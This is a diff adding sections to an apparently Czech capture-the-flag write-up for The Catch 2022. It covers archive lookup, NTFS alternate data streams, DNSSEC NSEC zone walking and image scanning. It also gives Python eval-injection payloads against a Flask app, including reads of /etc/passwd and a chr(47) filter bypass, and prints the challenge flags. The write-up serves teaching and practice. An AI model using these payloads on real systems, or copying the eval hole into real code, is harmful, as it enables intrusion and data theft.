@@ -453,12 +453,443 @@ Celý skriptík: [`solve.sh`](11_Fraudulent_email/solve.sh)
 
 ## Miscellaneous (9/9 bodů)
 
-TODO
+### Old webpages (1/1 bod)
+
+> Hi, packet inspector, the AI has apparently some problems to transfer data
+> from previous information system to new one. All packages in state "waiting
+> for pickup" were erroneously moved to state "delivered". Now, we have an angry
+> customer in our depot and she want her package with shipment ID 2022-0845.
+>
+> In the previous IS, each package had his own domain name (for example,
+> `ID 2022-0845` can be tracked on
+> <http://tracking-2022-0845.mysterious-delivery.thecatch.cz>).
+>
+> Find the pickup code for package `2022-0845` as soon as possible, so we can
+> give it to depot drone.
+>
+> May the Packet be with you!
+
+Když se podíváme na zadanou adresu, najdeme jenom obrázek smutné kočky a text
+"No code for already delivered packages." Takže kód na stránce asi dříve byl,
+ale po označení balíčku za doručený už je pryč.
+
+Všimneme si, že narozdíl od mnoha předchozích úloh je tahle na veřejné doméně,
+není schovaná za VPNkou. Je tak možné, že stránku někdy v minulosti zaindexoval
+WaybackMachine internetové archivu Archive.org. A skutečně:
+
+<https://web.archive.org/web/20220808090332/tracking-2022-0845.mysterious-delivery.thecatch.cz>
+
+Jak je vidět, tak to, co se jednou zjeví na internetu, už nezmizí. Na stránce se
+nachází hledaná vlajka: `FLAG{pUVd-t1k9-DbkL-4r5X}`
+
+### Download backup (2/2 body)
+
+> Hi, packet inspector,
+>
+> our former employee Brenda (head of PR department) was working on new webpage
+> with superdiscount code for VIP customers, but she get fired by AI because of
+> "disturbing lack of machine precision".
+>
+> Your task is to find the code as soon as possible. The only hope is an
+> automated backup of Brenda's Download directory (there is a high probability
+> that she had downloaded the discount page or part of it).
+>
+> Download [the backup file](https://owncloud.cesnet.cz/index.php/s/ZgIMem5NDbS5SYZ)
+> (MD5 checksum `2fd749e99a0237f506a0eb3e81633ad7`).
+>
+> May the Packet be with you!
+
+Na této úloze jsem se naučil zajímavé věci o RAR archivech a o souborovém
+systému NTFS. Ale popořadě :)
+
+Po stažení ZIPu získáme několik souborů, mezi nimi je nějaký minimální popis
+zálohy (včetně hesla k archivu) a RAR archiv. Když ho rozbalíme, tak z něj
+vypadne obsah složky Download, ve kterém je několik obrázků a PDFek:
+
+* `1098612x18781390.pdf` je zajímavý anglický článek o příbytcích pro kočky, ale
+  pro nás nezajímavý
+* `thecatch2022-form-header.png` a `xDracula_08-03-2012.jpg` jsou pro nás také
+  nezajímavé obrázky
+* `img.png` je obrázek, který se asi nacházel na zmiňované webové stránce se
+  slevou pro VIP zákazníky
+
+Po prozkoumání obrázku jsem dospěl k tomu, že v něm samotném se nic neskrývá,
+ale že budeme chtít nějak najít stránku, na které se nacházel.
+
+Nejdříve jsem zkoušel hledat obrázek na internetu pomocí reverse image search
+vyhledávačů, které umí najít obrázek podle obrázku, známý je například
+[TinyEye](https://tineye.com/). Bohužel bez úspěchu, povedlo se najít jenom
+dílčí obrázky, ze kterých byl velký obrázek vytvořen.
+
+Podíval jsem se proti na hint, který říkal, že Brenda pravděpodobně používala
+souborový systém NTFS. Po chvíli zkoumání jsem zjistil, že NTFS má vlastnost,
+které se říká ADS – Alternate Data Stream. Umožňuje k souborům ukládat různé
+"alternativní streamy" obsahující zajímavá metadata (nad rámec těch klasických
+jako je třeba datum vytvoření a změny). Zajímavé čtení o ADS se dá najít třeba
+zde: <https://www.sciencedirect.com/topics/computer-science/alternate-data-stream>
+
+Obdařen tímto novým zjištěním jsem zkoumal dál a zjistil jsem, že RAR archivy
+umějí ukládat ADS, popis k tomu se dá najít třeba v [manuálu WinRARu](http://acritum.com/winrar/console-rar-manual):
+
+> `-os`     Save NTFS streams. Win32 version only.
+>
+> This switch has meaning only for NTFS file system and allows
+> to save alternative data streams associated with a file.
+> It is especially important in Windows 2000, XP and newer,
+> which use streams to keep some file dependent information
+> like file descriptions. If you use RAR to backup your
+> NTFS disks, it is recommended to specify this switch.
+
+Takže úloha by asi šla vyřešit snadno ve Windows, kde bych RAR archiv rozbalil
+WinRARem a podíval se pak na ADS rozbalených souborů. Ale vážně hodně se mi
+nechtělo přebootovávat :D
+
+Pátral jsem tedy do třetice a přišel jsem na to, že 7zip by měl umět i na Linuxu
+alespoň zobrazit ADS a rozbalit je jako samostatné soubory. Jeho GUI verzi jsem
+našel jen ve snapu, takže:
+
+```sh
+$ snap install p7zip-desktop
+p7zip-desktop 16.02.2 from Ernesto Castellotti (ernytech) installed
+$ p7zip-desktop
+```
+
+Vyhledáme náš archiv a celý ho rozbalíme. Všimneme si, že u každého souboru je
+ještě přidružený soubor s názvem rozšířeným o `:Zone.Identifier`. Soubory
+obsahují textovou podobu ADS:
+
+```sh
+$ for a in *:Zone.Identifier; do echo "$a:"; cat "$a"; done
+img.png:Zone.Identifier:
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=http://self-service.mysterious-delivery.thecatch.cz/
+HostUrl=http://self-service.mysterious-delivery.thecatch.cz/img.png
+thecatch2022-form-header.png:Zone.Identifier:
+[ZoneTransfer]
+ZoneId=3
+HostUrl=https://www.thecatch.cz/files/4d0b6a22940277d009aad4a681d554c6/thecatch2022-form-header.png
+xDracula_08-03-2012.jpg:Zone.Identifier:
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=https://www.rouming.cz/roumingShow.php?file=xDracula_08-03-2012.jpg
+HostUrl=https://www.rouming.cz/archived/xDracula_08-03-2012.jpg
+1098612x18781390.pdf:Zone.Identifier:
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=https://www.researchgate.net/publication/326313071_Shelter_housing_for_cats_Practical_aspects_of_design_and_construction_and_adaptation_of_existing_accommodation
+HostUrl=https://www.researchgate.net/profile/Denae-Wagner/publication/326313071_Shelter_housing_for_cats_Practical_aspects_of_design_and_construction_and_adaptation_of_existing_accommodation/links/5bda2d074585150b2b945b6f/Shelter-housing-for-cats-Practical-aspects-of-design-and-construction-and-adaptation-of-existing-accommodation.pdf
+```
+
+Lehce už vyčteme adresu <http://self-service.mysterious-delivery.thecatch.cz/>,
+na které se nachází vlajka `FLAG{16bd-0c4x-ZRJe-8HC3}`.
+
+### DNS storage (3/3 body)
+
+> Hi, packet inspector,
+>
+> biggest surprise of the day is that the AI has started to use DNS as a storage
+> for its own information. The data are stored in TXT resource records in the
+> zone `mysterious-delivery.tcc`. The zone is deployed on DNS servers
+> `ns1.mysterious-delivery.thecatch.cz` and `ns2.mysterious-delivery.thecatch.cz`.
+>
+> Analyze content of zone and focus on any codes for our depot steel safes (AI
+> has changed the access code and we hope it is stored right in the DNS zone).
+>
+> May the Packet be with you!
+
+Data skrytá v DNSku, nice :)
+
+Podíváme se, co se v DNSku všechno skrývá pomocí `dig ANY @ns1.mysterious-delivery.thecatch.cz mysterious-delivery.tcc`.
+Dostaneme (zkráceno):
+
+```text
+;; ANSWER SECTION:
+mysterious-delivery.tcc. 86400	IN	SOA	ns1.mysterious-delivery.tcc. hostmaster.ns1.mysterious-delivery.tcc. 2022100101 604800 86400 2419200 86400
+mysterious-delivery.tcc. 86400	IN	RRSIG	SOA 8 2 86400 20221029112658 20220929112658 65089 mysterious-delivery.tcc. fZk3...
+mysterious-delivery.tcc. 86400	IN	NS	ns2.mysterious-delivery.thecatch.cz.
+mysterious-delivery.tcc. 86400	IN	NS	ns1.mysterious-delivery.thecatch.cz.
+mysterious-delivery.tcc. 86400	IN	RRSIG	NS 8 2 86400 20221029112658 20220929112658 65089 mysterious-delivery.tcc. cdUX...
+mysterious-delivery.tcc. 86400	IN	NSEC	www.customer-service.mysterious-delivery.tcc. NS SOA RRSIG NSEC DNSKEY
+mysterious-delivery.tcc. 86400	IN	RRSIG	NSEC 8 2 86400 20221029112658 20220929112658 65089 mysterious-delivery.tcc. 45uH...
+mysterious-delivery.tcc. 86400	IN	DNSKEY	256 3 8 AwEA...
+mysterious-delivery.tcc. 86400	IN	DNSKEY	257 3 8 AwEA...
+mysterious-delivery.tcc. 86400	IN	RRSIG	DNSKEY 8 2 86400 20221029112658 20220929112658 22312 mysterious-delivery.tcc. MsPz...
+mysterious-delivery.tcc. 86400	IN	RRSIG	DNSKEY 8 2 86400 20221029112658 20220929112658 65089 mysterious-delivery.tcc. QwEL...
+```
+
+Všimneme si, že tady žádný TXT záznam není, asi budeme muset najít jinou
+(sub)doménu. Ale ještě důležitější zjištění je to, že doména je chráněná pomocí
+DNSSEC. Můžeme si třeba pročíst [starý článek o DNSSEC na Root.cz](https://www.root.cz/clanky/jak-funguje-dnssec/)
+pro základní pochopení fungování.
+
+V kostce DNSSEC funguje podobně, jako webové certifikáty – autoritativní DNS server
+má svůj asymetrický klíč, jehož veřejná část je podepsaná někým důvěryhodným
+(nadřazenou doménou) a veřejný klíč společně s podpisem nadřazené domény tvoří
+certifikát uložený v DNSKEY klíčích. Když pak položím DNS serveru dotaz, tak mi
+normálně odpoví, ale zároveň mi přibalí ještě RRSIG, což je podpis odpovědi
+pomocí klíče z DNSKEY.
+
+*Poznámka: DNSKEY je tam typicky dvakrát, protože jeden z nich je delší a
+používá se jen k podepisování druhého kratšího DNSKEY, který se často rotuje a
+používá se pak k podepisování jednotlivých odpovědí. Ale to je pro nás
+nedůležité.*
+
+To je hezky navržený princip podepisování, ale kvůli zpětné kompatibilitě má
+jistou díru. Jak podepsat prázdnou odpověď, tedy jak to, že nikdo nemůže
+podvrhnout odpověď "x.y.z neexistuje"? K tomu byly vymyšlené záznamy NSEC, které
+existují pro každé validní jméno a říkají, které první jméno (v setřízeném
+seznamu) následuje po nich. Tedy když pro existující subdoménu `a.domena.cz`
+dostaneme NSEC záznam "další validní subdoména je až `f.domena.cz`, tak bezpečně
+víme, že doména `bedrich.domena.cz` neexistuje.
+
+Když se dotážeme přímo na doménu `bedrich.domena.cz`, tak dostaneme NSEC záznam
+pro `a.domane.cz` osvědčující, že další validní doména je skutečně až
+`f.domena.cz`. Vidíte už v tom tu díru? Ano… dá se takto lehce vylistovat celá
+zóna. Tole trochu řeší přechod na NSEC3 s hashi, ale zkusme, jestli tahle zóna
+nepoužívá plain NSEC záznamy:
+
+```sh
+$ dig +short NSEC @ns1.mysterious-delivery.thecatch.cz mysterious-delivery.tcc
+www.customer-service.mysterious-delivery.tcc. NS SOA RRSIG NSEC DNSKEY
+
+$ dig +short NSEC @ns1.mysterious-delivery.thecatch.cz www.customer-service.mysterious-delivery.tcc
+delay-generator.mysterious-delivery.tcc. CNAME RRSIG NSEC
+```
+
+Ano! Tak si pojďme vylistovat postupně celou doménu, dokud se nezacyklíme.
+U každédomény nás navíc bude zajímat TXT záznam (pokud existuje): [solve.sh](16_DNS_storage/solve.sh)
+
+```bash
+start=mysterious-delivery.tcc.
+domain=$start
+
+while true; do
+    read domain keys <<< $(dig +short +tcp +retry=10 NSEC @ns1.mysterious-delivery.thecatch.cz @ns2.mysterious-delivery.thecatch.cz "$domain")
+    echo $domain $keys
+    if [[ "$keys" == *TXT* ]]; then
+        echo -n "   TXT: "
+        dig +short +tcp +retry=10 TXT @ns1.mysterious-delivery.thecatch.cz @ns2.mysterious-delivery.thecatch.cz "$domain" 2>/dev/null
+    fi
+    if [ "$domain" = "$start" ]; then break; fi
+done
+```
+
+Používáme TCP spojení, protože je sice pomalejší, ale spolehlivější.
+
+*Poznámka: Trochu rychleji a lépe by to zvládl `ldns-walk` z balíčku `ldnstools`:
+`ldns-walk @ns1.mysterious-delivery.thecatch.cz mysterious-delivery.tcc`. Ale tohle
+je edukativnější :)*
+
+Když necháme skript chvilku běžet, tak dostaneme vylistovanou zónu s 1277 doménami
+a s TXT záznamy u většiny z nich, viz soubor [output.txt](16_DNS_storage/output.txt).
+Zajímavé TXT záznamy:
+
+* `depot-brno.mysterious-delivery.tcc`: sorry, no flags in brno
+* `depot-ceske-budejovice.mysterious-delivery.tcc`: everyone wants to live here
+* `depot-cesky-krumlov.mysterious-delivery.tcc`: life jackets overcharged
+* `depot-elsinor.mysterious-delivery.tcc`: to deliver or not to deliver, that is the question
+* `depot-kolin.mysterious-delivery.tcc`: the train stays mainly in the plain!
+* `depot-ostrava.mysterious-delivery.tcc`: undeground city, inhibitants can visit surface by pendolinos
+* … a pár dalších. až nakonec…
+* `depot-secret-upon-flag.mysterious-delivery.tcc`: secret code for steel safe is: RkxBR3tZcjMxLVhvWEUtNEZxOC02UElzfQ==
+
+Uděláme base64 decode a konečně získáváme `FLAG{Yr31-XoXE-4Fq8-6PIs}`.
+
+### Packet auditing (3/3 body)
+
+> Hi, packet inspector,
+>
+> the AI has "upgraded" our packet auditing system – time to time, it generates
+> archive of pictures, where the state of packet and the appropriate delivery
+> team is indicated by different colours for each packet transport number.
+>
+> We have a plea from `Brenda's delivery team` to find their missing packet in
+> state `ready for pickup` (the other teams have already delivered all their
+> packages mentioned in last given audit archive).
+>
+> Download [audit archive](https://owncloud.cesnet.cz/index.php/s/BGSbaBDCsuWdAYO)
+> (MD5 checksum `08ee155d2c9aee13ea5cab0a11196129`), find the desired pickup
+> code and enter it on webpage <http://pickup.mysterious-delivery.thecatch.cz>
+> to collect pickup code.
+
+Tohle byla zase jedna z těch hezkých přímočarých úloh, kde bylo hned od začátku
+jasné, co je potřeba udělat.
+
+Po stažení a rozbalení archivu a nás vypadlo celkem 1083 složek v několika
+úrovních a v nich 25001 PNG souborů , kde každý má nějak barevné pozadí a nějak
+barevný balíček. Vypadají třeba takto:
+
+![ukázka](18_Packet_auditing/example.png)
+
+Mimo toho na nás také vypadl obrázek s legendou:
+
+![barevná legenda](18_Packet_auditing/description.png)
+
+Naším úkolem je tedy najít obrázek s oranžovým pozadím (tým Brenda) a zeleným
+balíčkem (ready for pickup). Dělat to ručně by bylo značně otravné, pojďme si
+napsat program.
+
+Náš program by měl projít strukturu složek, načíst každý PNG soubor a zjistit
+barvu balíčku a pozadí (a pokud budou odpovídat, tak nám dát vědět jméno
+souboru). Protože jsou všechny obrázky stejně velké, tak si vybereme dvoje
+souřadnice pixelu, které nás budou zajímat:
+
+* pro barvu pozadí vezmeme levý vrchí roh obrázku: `[0, 0]`
+* pro bravu balíčku vezmeme pixel někde hluboku v balíčku daleko od jeho hran: `[120, 120]`
+
+Poté potřebujeme určit barvy. Napoprvé jsem se trochu nachytal, protože
+v legendě jsou barvy trošku jiné, než v jednotlivých souborech zásilek (jen
+nepatrně, ale pokud to chceme porovnávat přesně, nachytá nás to). Prolistujeme
+tedy pár souborů a vezmeme barvy z nich:
+
+* hledáme pozadí a barvou `(242, 121, 48)`
+* hledáme balíček s barvou `(0, 133, 71)`
+
+Program můžeme napsat v Pythonu, kde je skvělá jednoduchá knihovna na práci
+s obrázky [Pillow](https://pypi.org/project/Pillow/) (také zvaná `PIL`). Program
+je celkem jednoduchý: [solver.py](18_Packet_auditing/solver.py)
+
+Po chvíli nám oznámí soubor `2022-08/30/19/000000.png`, v němž se nachází
+pickup code `629-367-219-835`, který můžeme zadat na webu a získat tak kód
+vlajky: `FLAG{rNM8-Aa5G-dF5y-6LqY}`
 
 ## Corporate websites (7/25 bodů)
 
 Tato část mě skutečně potrápila a zde se rozhodovalo o vítězství. Bohužel se mi
 povedlo vyřešit jen dvě ze šesti úloh, i když k řešení některých dalších jsem
 měl trochu našlápnuto. Bohužel se však nezadařilo.
+
+## Streamlining portal (3/3 body)
+
+> Hi, packet inspector,
+>
+> the AI is preparing some kind of employee streamlining portal on
+> <http://user-info.mysterious-delivery.tcc>. We fear this will lead to more
+> lost packages.
+>
+> Your task is to break into the web and find interesting information on the
+> server.
+>
+> May the Packet be with you!
+
+Když navštívíme stránku, tak dostaneme hned přesměrování na URL
+<http://user-info.mysterious-delivery.tcc/hello/user>, kde se nám zobrazí "Hello user".
+o svádí k tomu napsat do URL něco jiného… a skutečně, když změníme poslední část
+na cokoliv, tak se to vypíše.
+
+Zkusme, jestli se tím nedá provést nějaký code injection do šablonovacího
+systému. První bychom potřebovali zjistit, v jakém jazyce je web napsaný. Zkusme
+nejdříve, jestli to není Python, třeba payloadem `"+__file__+"`. Zobrazí se nám
+"Hello /app/app.py", je to Python!
+
+Nyní si můžeme zkoušet hrát. Zkusme si vypsat zdrojový kód souboru app.py payloadem `"+str(open(__file__).read())+"`
+([odkaz](http://user-info.mysterious-delivery.tcc/hello/%22+str(open(__file__).read())+%22)).
+V tuto chvíli je dobré si zobrazit HTML kód stránky, ať vidíme kód aspoň trochu formátovaný:
+
+```python3
+from flask import Flask, Blueprint, redirect, render_template
+bp = Blueprint("app", __name__)
+
+def create_app():
+    app = Flask(__name__)
+    app.register_blueprint(bp, url_prefix="/")
+    return app
+
+@bp.route('/hello/<path:userstring>')
+def hello(userstring):
+    message = eval('"Hello ' + userstring + '"')
+    return render_template('index.html', message=message)
+
+@bp.route('/')
+def redirect_to_user():
+    return redirect("/hello/user", code=302)
+```
+
+Vidíme, že je jedná o skutečně jednoduchou aplikaci napsanou v Pythonu pomocí
+webového frameworku [Flask](https://cs.wikipedia.org/wiki/Flask). Ale vlajka ve
+zdrojáku není, pojďme tedy zkoumat systém:
+
+* Vypsání `/etc/passwd`: `"+str(open('/etc/passwd').read())+"` [odkaz](http://user-info.mysterious-delivery.tcc/hello/%22+str(open(%22/etc/passwd%22).read())+%22)
+* Vylistování `/app`: `"+str(__import__("os").listdir("/app"))+"` [odkaz](http://user-info.mysterious-delivery.tcc/hello/%22+str(__import__(%22os%22).listdir(%22/app%22))+%22)
+* Vylistování `/app/FLAG/`: `"+str(__import__("os").listdir("/app/FLAG/"))+"` [odkaz](http://user-info.mysterious-delivery.tcc/hello/%22+str(__import__(%22os%22).listdir(%22/app/FLAG/%22))+%22)
+* Přečtení `/app/FLAG/flag.txt`: `"+str(open("/app/FLAG/flag.txt").read())+"` [odkaz](http://user-info.mysterious-delivery.tcc/hello/%22+str(open(%22/app/FLAG/flag.txt%22).read())+%22)
+
+Na poslední zmíněné stránce najdeme vlajku `FLAG{OONU-Pm7V-BK3s-YftK}`.
+
+## Streamlining portal NG (4/4 body)
+
+Bylo odemčeno po dokončení **Streamlining portal**.
+
+> Hi, packet inspector,
+>
+> the AI has detected your previous breach and has improved the security
+> measures. New streamlining portal is on
+> <http://user-info-ng.mysterious-delivery.tcc>.
+>
+> Your task is to break into the improved web and find again interesting
+> information on the server.
+>
+> May the Packet be with you!
+
+Úloha je velmi podobná předchozí, stránka vypadá stejně, ale autor stránky nám
+to trochu ztížil. Opět zkusíme stejný trik a vypíšeme si zdroják aplikace
+payloadem `"+str(open(__file__).read())+"`
+([odkaz](http://user-info-ng.mysterious-delivery.tcc/hello/%22+str(open(__file__).read())+%22)):
+
+```python3
+from flask import Flask, Blueprint, redirect, render_template, abort
+bp = Blueprint("app", __name__)
+
+def create_app():
+    app = Flask(__name__)
+    app.register_blueprint(bp, url_prefix="/")
+    return app
+
+@bp.route('/hello/<userstring>')
+def hello(userstring):
+    if 'cd ' in userstring:
+        abort(403)
+    message = eval('"Hello ' + userstring + '"')
+    return render_template('index.html', message=message)
+
+@bp.route('/')
+def redirect_to_user():
+    return redirect("/hello/user";, code=302)
+```
+
+Jsou zde dvě odlišnosti:
+
+* nemůžeme ve "jménu" použít `cd` pro změnu složky
+* nemůžeme ve "jménu" jednoduše použít `/`, protože parametr `userstring` už
+  není typu `path` a tak se usekne před prvním lomítkem a aplikace nám na
+  výraz s lomítkem [vrátí 404](http://user-info-ng.mysterious-delivery.tcc/hello/user/a)
+
+Ale tahle obrana je velmi lajdácká. Znak `/` nám sice neprojde, ale skoro cokoliv
+jiného ano (dokud to nebude obsahovat substring `cd`). Způsob, jak v Pythonu
+získat string `/` je třeba `chr(47)`, tak toho pojďme využít a jen upravme
+naše minulé payloady:
+
+* Vylistování `/app`: `"+str(__import__("os").listdir(chr(47)+"app"))+"` [odkaz](http://user-info-ng.mysterious-delivery.tcc/hello/%22+str(__import__(%22os%22).listdir(chr(47)+%22app%22))+%22)
+* Vylistování `/app/FLAG/`: `"+str(__import__("os").listdir(chr(47)+"app"+chr(47)+"FLAG"))+"` [odkaz](http://user-info-ng.mysterious-delivery.tcc/hello/%22+str(__import__(%22os%22).listdir(chr(47)+%22app%22+chr(47)+%22FLAG%22))+%22)
+* Přečtení `/app/FLAG/flag.txt`: `"+str(open(chr(47)+"app"+chr(47)+"FLAG"+chr(47)+"flag.txt").read())+"` [odkaz](http://user-info-ng.mysterious-delivery.tcc/hello/%22+str(open(chr(47)+%22app%22+chr(47)+%22FLAG%22+chr(47)+%22flag.txt%22).read())+%22)
+
+Na poslední zmíněné stránce najdeme vlajku `FLAG{hvIM-3aty-R39h-dOZ4}`.
+
+---
+
+## XML Prettifier (nedokončeno, 4 body)
+
+TODO
+
+## Blog site (nedokončeno, 4 body)
+
+TODO
+
+## Phonebook (nedokončeno, 5 bodů)
+
+TODO
+
+## Orderly IS (nedokončeno, 5 bodů)
 
 TODO
